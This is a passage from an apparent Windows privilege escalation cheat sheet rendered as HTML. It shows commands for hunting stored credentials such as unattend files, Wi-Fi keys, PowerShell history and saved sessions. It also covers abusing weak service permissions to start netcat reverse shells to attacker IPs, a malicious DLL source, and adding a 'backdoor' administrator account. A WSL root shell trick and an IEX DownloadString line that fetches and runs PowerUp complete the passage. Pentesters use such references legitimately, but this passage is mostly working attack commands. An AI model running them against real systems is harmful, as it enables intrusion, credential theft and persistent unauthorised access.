</span></span></code></pre></div><p>Display the content of these files with <code>dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul</code>.</p><p>Example content</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>&lt;component name=<span style=color:#e6db74>&#34;Microsoft-Windows-Shell-Setup&#34;</span> publicKeyToken=<span style=color:#e6db74>&#34;31bf3856ad364e35&#34;</span> language=<span style=color:#e6db74>&#34;neutral&#34;</span> versionScope=<span style=color:#e6db74>&#34;nonSxS&#34;</span> processorArchitecture=<span style=color:#e6db74>&#34;amd64&#34;</span>&gt;
</span></span><span style=display:flex><span>    &lt;AutoLogon&gt;
</span></span><span style=display:flex><span>     &lt;Password&gt;U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==&lt;/Password&gt;
</span></span><span style=display:flex><span>     &lt;Enabled&gt;true&lt;/Enabled&gt;
</span></span><span style=display:flex><span>     &lt;Username&gt;Administrateur&lt;/Username&gt;
</span></span><span style=display:flex><span>    &lt;/AutoLogon&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    &lt;UserAccounts&gt;
</span></span><span style=display:flex><span>     &lt;LocalAccounts&gt;
</span></span><span style=display:flex><span>      &lt;LocalAccount wcm<span style=color:#960050;background-color:#1e0010>:</span>action=<span style=color:#e6db74>&#34;add&#34;</span>&gt;
</span></span><span style=display:flex><span>       &lt;Password&gt;*SENSITIVE*DATA*DELETED*&lt;/Password&gt;
</span></span><span style=display:flex><span>       &lt;Group&gt;administrators;users&lt;/Group&gt;
</span></span><span style=display:flex><span>       &lt;Name&gt;Administrateur&lt;/Name&gt;
</span></span><span style=display:flex><span>      &lt;/LocalAccount&gt;
</span></span><span style=display:flex><span>     &lt;/LocalAccounts&gt;
</span></span><span style=display:flex><span>    &lt;/UserAccounts&gt;
</span></span></code></pre></div><p>Unattend credentials are stored in base64 and can be decoded manually with base64.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$ echo <span style=color:#e6db74>&#34;U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=&#34;</span>  | base64 -d 
</span></span><span style=display:flex><span>SecretSecurePassword1234*
</span></span></code></pre></div><p>The Metasploit module <code>post/windows/gather/enum_unattend</code> looks for these files.</p><h3 id=iis-web-config>IIS Web config
<a class=anchor href=#iis-web-config>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>Get-Childitem <span style=color:#960050;background-color:#1e0010>â€“</span>Path C:\inetpub\ -Include web.config <span style=color:#f92672>-File</span> -Recurse -ErrorAction SilentlyContinue
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>C:\Windows\Microsoft.NET\Framework64\v4.0.<span style=color:#ae81ff>30319</span>\Config\web.config
</span></span><span style=display:flex><span>C:\inetpub\wwwroot\web.config
</span></span></code></pre></div><h3 id=other-files>Other files
<a class=anchor href=#other-files>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bat data-lang=bat><span style=display:flex><span>%SYSTEMDRIVE%\pagefile.sys
</span></span><span style=display:flex><span>%WINDIR%\debug\NetSetup.log
</span></span><span style=display:flex><span>%WINDIR%\repair\sam
</span></span><span style=display:flex><span>%WINDIR%\repair\system
</span></span><span style=display:flex><span>%WINDIR%\repair\software, %WINDIR%\repair\security
</span></span><span style=display:flex><span>%WINDIR%\iis6.log
</span></span><span style=display:flex><span>%WINDIR%\system32\config\AppEvent.Evt
</span></span><span style=display:flex><span>%WINDIR%\system32\config\SecEvent.Evt
</span></span><span style=display:flex><span>%WINDIR%\system32\config\default.sav
</span></span><span style=display:flex><span>%WINDIR%\system32\config\security.sav
</span></span><span style=display:flex><span>%WINDIR%\system32\config\software.sav
</span></span><span style=display:flex><span>%WINDIR%\system32\config\system.sav
</span></span><span style=display:flex><span>%WINDIR%\system32\CCM\logs\*.log
</span></span><span style=display:flex><span>%USERPROFILE%\ntuser.dat
</span></span><span style=display:flex><span>%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
</span></span><span style=display:flex><span>%WINDIR%\System32\drivers\etc\hosts
</span></span><span style=display:flex><span>C:\ProgramData\Configs\*
</span></span><span style=display:flex><span>C:\Program<span style=color:#75715e> Files\Windows PowerShell\*</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>dir</span> c:*vnc.ini /s /b
</span></span><span style=display:flex><span><span style=color:#66d9ef>dir</span> c:*ultravnc.ini /s /b
</span></span></code></pre></div><h3 id=wifi-passwords>Wifi passwords
<a class=anchor href=#wifi-passwords>#</a></h3><p>Find AP SSID</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bat data-lang=bat><span style=display:flex><span>netsh wlan show profile
</span></span></code></pre></div><p>Get Cleartext Pass</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bat data-lang=bat><span style=display:flex><span>netsh wlan show profile &lt;SSID&gt; key=clear
</span></span></code></pre></div><p>Oneliner method to extract wifi passwords from all the access point.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-batch data-lang=batch><span style=display:flex><span><span style=color:#66d9ef>cls</span> &amp; <span style=color:#66d9ef>echo</span>. &amp; <span style=color:#66d9ef>for</span> <span style=color:#66d9ef>/f</span> <span style=color:#e6db74>&#34;tokens=4 delims=: &#34;</span> %a in (&#39;netsh wlan show profiles ^| find &#34;Profile &#34;&#39;) do @echo off &gt; nul &amp; (netsh wlan show profiles name=%a key=clear | findstr <span style=color:#e6db74>&#34;SSID Cipher Content&#34;</span> | find /v <span style=color:#e6db74>&#34;Number&#34;</span> &amp; <span style=color:#66d9ef>echo</span>.) &amp; @<span style=color:#66d9ef>echo</span> on
</span></span></code></pre></div><h3 id=sticky-notes-passwords>Sticky Notes passwords
<a class=anchor href=#sticky-notes-passwords>#</a></h3><p>The sticky notes app stores it&rsquo;s content in a sqlite db located at <code>C:\Users\&lt;user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite</code></p><h3 id=passwords-stored-in-services>Passwords stored in services
<a class=anchor href=#passwords-stored-in-services>#</a></h3><p>Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using <a href=https://github.com/Arvanaghi/SessionGopher>SessionGopher</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>https<span style=color:#960050;background-color:#1e0010>:</span>//raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
</span></span><span style=display:flex><span>Import-Module path\to\SessionGopher.ps1;
</span></span><span style=display:flex><span>Invoke-SessionGopher -AllDomain -o
</span></span><span style=display:flex><span>Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
</span></span></code></pre></div><h3 id=passwords-stored-in-key-manager>Passwords stored in Key Manager
<a class=anchor href=#passwords-stored-in-key-manager>#</a></h3><p>:warning: This software will display its output in a GUI</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span>rundll32 keymgr,KRShowKeyMgr
</span></span></code></pre></div><h3 id=powershell-history>Powershell History
<a class=anchor href=#powershell-history>#</a></h3><p>Disable Powershell history: <code>Set-PSReadlineOption -HistorySaveStyle SaveNothing</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>type <span style=color:#66d9ef>%</span>userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
</span></span><span style=display:flex><span>type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
</span></span><span style=display:flex><span>type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
</span></span><span style=display:flex><span>cat (Get-PSReadlineOption).HistorySavePath
</span></span><span style=display:flex><span>cat (Get-PSReadlineOption).HistorySavePath | sls passw
</span></span></code></pre></div><h3 id=powershell-transcript>Powershell Transcript
<a class=anchor href=#powershell-transcript>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span>C:\Users\<span style=color:#f92672>&lt;USERNAME&gt;</span>\Documents\PowerShell_transcript.<span style=color:#f92672>&lt;HOSTNAME&gt;</span>.<span style=color:#f92672>&lt;RANDOM&gt;</span>.<span style=color:#f92672>&lt;TIMESTAMP&gt;</span>.txt
</span></span><span style=display:flex><span>C:\Transcripts\<span style=color:#f92672>&lt;DATE&gt;</span>\PowerShell_transcript.<span style=color:#f92672>&lt;HOSTNAME&gt;</span>.<span style=color:#f92672>&lt;RANDOM&gt;</span>.<span style=color:#f92672>&lt;TIMESTAMP&gt;</span>.txt
</span></span></code></pre></div><h3 id=password-in-alternate-data-stream>Password in Alternate Data Stream
<a class=anchor href=#password-in-alternate-data-stream>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span>PS &gt; Get-Item -path flag.txt -Stream *
</span></span><span style=display:flex><span>PS &gt; Get-Content -path flag.txt -Stream Flag
</span></span></code></pre></div><h2 id=eop---processes-enumeration-and-tasks>EoP - Processes Enumeration and Tasks
<a class=anchor href=#eop---processes-enumeration-and-tasks>#</a></h2><ul><li><p>What processes are running?</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>tasklist /v
</span></span><span style=display:flex><span>net start
</span></span><span style=display:flex><span>sc query
</span></span><span style=display:flex><span>Get-Service
</span></span><span style=display:flex><span>Get-Process
</span></span><span style=display:flex><span>Get-WmiObject -Query <span style=color:#e6db74>&#34;Select * from Win32_Process&#34;</span> | where {$_.Name <span style=color:#f92672>-notlike</span> <span style=color:#e6db74>&#34;svchost*&#34;</span>} | Select Name, Handle, @{Label=<span style=color:#e6db74>&#34;Owner&#34;</span>;Expression={$_.GetOwner().User}} | ft -AutoSize
</span></span></code></pre></div></li><li><p>Which processes are running as &ldquo;system&rdquo;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>tasklist /v /fi <span style=color:#e6db74>&#34;username eq system&#34;</span>
</span></span></code></pre></div></li><li><p>Do you have powershell magic?</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>REG QUERY <span style=color:#e6db74>&#34;HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine&#34;</span> /v PowerShellVersion
</span></span></code></pre></div></li><li><p>List installed programs</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>Get-ChildItem <span style=color:#e6db74>&#39;C:\Program Files&#39;</span>, <span style=color:#e6db74>&#39;C:\Program Files (x86)&#39;</span> | ft Parent,Name,LastWriteTime
</span></span><span style=display:flex><span>Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
</span></span></code></pre></div></li><li><p>List services</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>net start
</span></span><span style=display:flex><span>wmic service list brief
</span></span><span style=display:flex><span>tasklist /SVC
</span></span></code></pre></div></li><li><p>Enumerate scheduled tasks</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>schtasks /query /fo LIST <span style=color:#ae81ff>2</span>&gt;nul | findstr TaskName
</span></span><span style=display:flex><span>schtasks /query /fo LIST /v &gt; schtasks.txt; cat schtask.txt | grep <span style=color:#e6db74>&#34;SYSTEM\|Task To Run&#34;</span> | grep -B <span style=color:#ae81ff>1</span> SYSTEM
</span></span><span style=display:flex><span>Get-ScheduledTask | where {$_.TaskPath <span style=color:#f92672>-notlike</span> <span style=color:#e6db74>&#34;\Microsoft*&#34;</span>} | ft TaskName,TaskPath,State
</span></span></code></pre></div></li><li><p>Startup tasks</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>wmic startup get caption,command
</span></span><span style=display:flex><span>reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
</span></span><span style=display:flex><span>reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
</span></span><span style=display:flex><span>reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
</span></span><span style=display:flex><span>dir <span style=color:#e6db74>&#34;C:\Documents and Settings\All Users\Start Menu\Programs\Startup&#34;</span>
</span></span><span style=display:flex><span>dir <span style=color:#e6db74>&#34;C:\Documents and Settings\%username%\Start Menu\Programs\Startup&#34;</span>
</span></span></code></pre></div></li></ul><h2 id=eop---incorrect-permissions-in-services>EoP - Incorrect permissions in services
<a class=anchor href=#eop---incorrect-permissions-in-services>#</a></h2><blockquote><p>A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system.</p></blockquote><p>Often, services are pointing to writeable locations:</p><ul><li><p>Orphaned installs, not installed anymore but still exist in startup</p></li><li><p>DLL Hijacking</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># find missing DLL </span>
</span></span><span style=display:flex><span>- Find-PathDLLHijack PowerUp.ps1
</span></span><span style=display:flex><span>- <span style=color:#66d9ef>Process</span> Monitor <span style=color:#960050;background-color:#1e0010>:</span> check <span style=color:#66d9ef>for</span> <span style=color:#e6db74>&#34;Name Not Found&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># compile a malicious dll</span>
</span></span><span style=display:flex><span>- <span style=color:#66d9ef>For</span> x64 compile with<span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#e6db74>&#34;x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll&#34;</span>
</span></span><span style=display:flex><span>- <span style=color:#66d9ef>For</span> x86 compile with<span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#e6db74>&#34;i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># content of windows_dll.c</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#include &lt;windows.h&gt;</span>
</span></span><span style=display:flex><span>BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (dwReason == DLL_PROCESS_ATTACH) {
</span></span><span style=display:flex><span>        system(<span style=color:#e6db74>&#34;cmd.exe /k whoami &gt; C:\\Windows\\Temp\\dll.txt&#34;</span>);
</span></span><span style=display:flex><span>        ExitProcess(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> TRUE;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></li><li><p>PATH directories with weak permissions</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$ <span style=color:#66d9ef>for</span> /f <span style=color:#e6db74>&#34;tokens=2 delims=&#39;=&#39;&#34;</span> <span style=color:#66d9ef>%</span>a <span style=color:#66d9ef>in</span> (<span style=color:#e6db74>&#39;wmic service list full^|find /i &#34;pathname&#34;^|find /i /v &#34;system32&#34;&#39;</span>) <span style=color:#66d9ef>do</span> @echo <span style=color:#66d9ef>%</span>a &gt;&gt; c:\windows\temp\permissions.txt
</span></span><span style=display:flex><span>$ <span style=color:#66d9ef>for</span> /f eol^=^<span style=color:#e6db74>&#34;^ delims^=^&#34;</span> <span style=color:#66d9ef>%</span>a <span style=color:#66d9ef>in</span> (c:\windows\temp\permissions.txt) <span style=color:#66d9ef>do</span> cmd.exe /c icacls <span style=color:#e6db74>&#34;%a&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ sc query state=all | findstr <span style=color:#e6db74>&#34;SERVICE_NAME:&#34;</span> &gt;&gt; Servicenames.txt
</span></span><span style=display:flex><span><span style=color:#66d9ef>FOR</span> /F <span style=color:#66d9ef>%</span>i <span style=color:#66d9ef>in</span> (Servicenames.txt) <span style=color:#66d9ef>DO</span> echo <span style=color:#66d9ef>%</span>i
</span></span><span style=display:flex><span>type Servicenames.txt
</span></span><span style=display:flex><span><span style=color:#66d9ef>FOR</span> /F <span style=color:#e6db74>&#34;tokens=2 delims= &#34;</span> <span style=color:#66d9ef>%</span>i <span style=color:#66d9ef>in</span> (Servicenames.txt) <span style=color:#66d9ef>DO</span> @echo <span style=color:#66d9ef>%</span>i &gt;&gt; services.txt
</span></span><span style=display:flex><span><span style=color:#66d9ef>FOR</span> /F <span style=color:#66d9ef>%</span>i <span style=color:#66d9ef>in</span> (services.txt) <span style=color:#66d9ef>DO</span> @sc qc <span style=color:#66d9ef>%</span>i | findstr <span style=color:#e6db74>&#34;BINARY_PATH_NAME&#34;</span> &gt;&gt; path.txt
</span></span></code></pre></div></li></ul><p>Alternatively you can use the Metasploit exploit : <code>exploit/windows/local/service_permissions</code></p><p>Note to check file permissions you can use <code>cacls</code> and <code>icacls</code></p><blockquote><p>icacls (Windows Vista +)<br>cacls (Windows XP)</p></blockquote><p>You are looking for <code>BUILTIN\Users:(F)</code>(Full access), <code>BUILTIN\Users:(M)</code>(Modify access) or <code>BUILTIN\Users:(W)</code>(Write-only access) in the output.</p><h3 id=example-with-windows-10---cve-2019-1322-usosvc>Example with Windows 10 - CVE-2019-1322 UsoSvc
<a class=anchor href=#example-with-windows-10---cve-2019-1322-usosvc>#</a></h3><p>Prerequisite: Service account</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>PS C:\Windows\system32&gt; sc.exe stop UsoSvc
</span></span><span style=display:flex><span>PS C:\Windows\system32&gt; sc.exe config usosvc binPath=<span style=color:#e6db74>&#34;C:\Windows\System32\spool\drivers\color\nc.exe 10.10.10.10 4444 -e cmd.exe&#34;</span>
</span></span><span style=display:flex><span>PS C:\Windows\system32&gt; sc.exe config UsoSvc binpath= <span style=color:#e6db74>&#34;C:\Users\mssql-svc\Desktop\nc.exe 10.10.10.10 4444 -e cmd.exe&#34;</span>
</span></span><span style=display:flex><span>PS C:\Windows\system32&gt; sc.exe config UsoSvc binpath= <span style=color:#e6db74>&#34;cmd /C C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe&#34;</span>
</span></span><span style=display:flex><span>PS C:\Windows\system32&gt; sc.exe qc usosvc
</span></span><span style=display:flex><span>[<span style=color:#66d9ef>SC</span>] QueryServiceConfig SUCCESS
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>SERVICE_NAME<span style=color:#960050;background-color:#1e0010>:</span> usosvc
</span></span><span style=display:flex><span>        TYPE               <span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>20</span>  WIN32_SHARE_PROCESS 
</span></span><span style=display:flex><span>        START_TYPE         <span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>2</span>   AUTO_START  (DELAYED)
</span></span><span style=display:flex><span>        ERROR_CONTROL      <span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>1</span>   NORMAL
</span></span><span style=display:flex><span>        BINARY_PATH_NAME   <span style=color:#960050;background-color:#1e0010>:</span> C:\Users\mssql-svc\Desktop\nc.exe <span style=color:#ae81ff>10.10</span>.10.10 <span style=color:#ae81ff>4444</span> -e cmd.exe
</span></span><span style=display:flex><span>        LOAD_ORDER_GROUP   <span style=color:#960050;background-color:#1e0010>:</span> 
</span></span><span style=display:flex><span>        TAG                <span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>        DISPLAY_NAME       <span style=color:#960050;background-color:#1e0010>:</span> Update Orchestrator Service
</span></span><span style=display:flex><span>        DEPENDENCIES       <span style=color:#960050;background-color:#1e0010>:</span> rpcss
</span></span><span style=display:flex><span>        SERVICE_START_NAME <span style=color:#960050;background-color:#1e0010>:</span> LocalSystem
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PS C:\Windows\system32&gt; sc.exe start UsoSvc
</span></span></code></pre></div><h3 id=example-with-windows-xp-sp1---upnphost>Example with Windows XP SP1 - upnphost
<a class=anchor href=#example-with-windows-xp-sp1---upnphost>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># NOTE: spaces are mandatory for this exploit to work !</span>
</span></span><span style=display:flex><span>sc config upnphost binpath= <span style=color:#e6db74>&#34;C:\Inetpub\wwwroot\nc.exe 10.11.0.73 4343 -e C:\WINDOWS\System32\cmd.exe&#34;</span>
</span></span><span style=display:flex><span>sc config upnphost obj= <span style=color:#e6db74>&#34;.\LocalSystem&#34;</span> password= <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>sc qc upnphost
</span></span><span style=display:flex><span>sc config upnphost depend= <span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>net start upnphost
</span></span></code></pre></div><p>If it fails because of a missing dependency, try the following commands.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>sc config SSDPSRV start=auto
</span></span><span style=display:flex><span>net start SSDPSRV
</span></span><span style=display:flex><span>net stop upnphost
</span></span><span style=display:flex><span>net start upnphost
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sc config upnphost depend=<span style=color:#e6db74>&#34;&#34;</span>
</span></span></code></pre></div><p>Using <a href=https://web.archive.org/web/20080530012252/http://live.sysinternals.com/accesschk.exe><code>accesschk</code></a> from Sysinternals or <a href=https://github.com/phackt/pentest/blob/master/privesc/windows/accesschk-XP.exe>accesschk-XP.exe - github.com/phackt</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$ accesschk.exe -uwcqv <span style=color:#e6db74>&#34;Authenticated Users&#34;</span> * /accepteula
</span></span><span style=display:flex><span>RW SSDPSRV
</span></span><span style=display:flex><span>        SERVICE_ALL_ACCESS
</span></span><span style=display:flex><span>RW upnphost
</span></span><span style=display:flex><span>        SERVICE_ALL_ACCESS
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ accesschk.exe -ucqv upnphost
</span></span><span style=display:flex><span>upnphost
</span></span><span style=display:flex><span>  RW NT AUTHORITY\SYSTEM
</span></span><span style=display:flex><span>        SERVICE_ALL_ACCESS
</span></span><span style=display:flex><span>  RW BUILTIN\Administrators
</span></span><span style=display:flex><span>        SERVICE_ALL_ACCESS
</span></span><span style=display:flex><span>  RW NT AUTHORITY\Authenticated Users
</span></span><span style=display:flex><span>        SERVICE_ALL_ACCESS
</span></span><span style=display:flex><span>  RW BUILTIN\Power Users
</span></span><span style=display:flex><span>        SERVICE_ALL_ACCESS
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$ sc config &lt;vuln-service&gt; binpath=<span style=color:#e6db74>&#34;net user backdoor backdoor123 /add&#34;</span>
</span></span><span style=display:flex><span>$ sc config &lt;vuln-service&gt; binpath= <span style=color:#e6db74>&#34;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&#34;</span>
</span></span><span style=display:flex><span>$ sc stop &lt;vuln-service&gt;
</span></span><span style=display:flex><span>$ sc start &lt;vuln-service&gt;
</span></span><span style=display:flex><span>$ sc config &lt;vuln-service&gt; binpath=<span style=color:#e6db74>&#34;net localgroup Administrators backdoor /add&#34;</span>
</span></span><span style=display:flex><span>$ sc stop &lt;vuln-service&gt;
</span></span><span style=display:flex><span>$ sc start &lt;vuln-service&gt;
</span></span></code></pre></div><h2 id=eop---windows-subsystem-for-linux-wsl>EoP - Windows Subsystem for Linux (WSL)
<a class=anchor href=#eop---windows-subsystem-for-linux-wsl>#</a></h2><p>Technique borrowed from <a href=https://twitter.com/Warlockobama/status/1067890915753132032>Warlockobama&rsquo;s tweet</a></p><blockquote><p>With root privileges Windows Subsystem for Linux (WSL) allows users to create a bind shell on any port (no elevation needed). Don&rsquo;t know the root password? No problem just set the default user to root W/ <distro>.exe &ndash;default-user root. Now start your bind shell or reverse.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>wsl whoami
</span></span><span style=display:flex><span>./ubuntun1604.exe config --default-user root
</span></span><span style=display:flex><span>wsl whoami
</span></span><span style=display:flex><span>wsl python -c <span style=color:#e6db74>&#39;BIND_OR_REVERSE_SHELL_PYTHON_CODE&#39;</span>
</span></span></code></pre></div><p>Binary <code>bash.exe</code> can also be found in <code>C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe</code></p><p>Alternatively you can explore the <code>WSL</code> filesystem in the folder <code>C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\</code></p><h2 id=eop---unquoted-service-paths>EoP - Unquoted Service Paths
<a class=anchor href=#eop---unquoted-service-paths>#</a></h2><p>The Microsoft Windows Unquoted Service Path Enumeration Vulnerability. All Windows services have a Path to its executable. If that path is unquoted and contains whitespace or other separators, then the service will attempt to access a resource in the parent path first.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>wmic service get name,displayname,pathname,startmode |findstr /i <span style=color:#e6db74>&#34;Auto&#34;</span> |findstr /i /v <span style=color:#e6db74>&#34;C:\Windows\\&#34;</span> |findstr /i /v <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>wmic service get name,displayname,startmode,pathname | findstr /i /v &#34;</span>C:\Windows\\<span style=color:#e6db74>&#34; |findstr /i /v &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode <span style=color:#f92672>-eq</span> <span style=color:#e6db74>&#34;Auto&#34;</span> <span style=color:#f92672>-and</span> $_.PathName <span style=color:#f92672>-notlike</span> <span style=color:#e6db74>&#34;C:\Windows*&#34;</span> <span style=color:#f92672>-and</span> $_.PathName <span style=color:#f92672>-notlike</span> <span style=color:#e6db74>&#39;&#34;*&#39;</span>} | select PathName,DisplayName,Name
</span></span></code></pre></div><ul><li>Metasploit exploit : <code>exploit/windows/local/trusted_service_path</code></li><li>PowerUp exploit<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># find the vulnerable application</span>
</span></span><span style=display:flex><span>C:\&gt; powershell.exe -nop -exec bypass <span style=color:#e6db74>&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://your-site.com/PowerUp.ps1&#39;); Invoke-AllChecks&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>[*] Checking <span style=color:#66d9ef>for</span> unquoted service paths...
</span></span><span style=display:flex><span>ServiceName   <span style=color:#960050;background-color:#1e0010>:</span> BBSvc
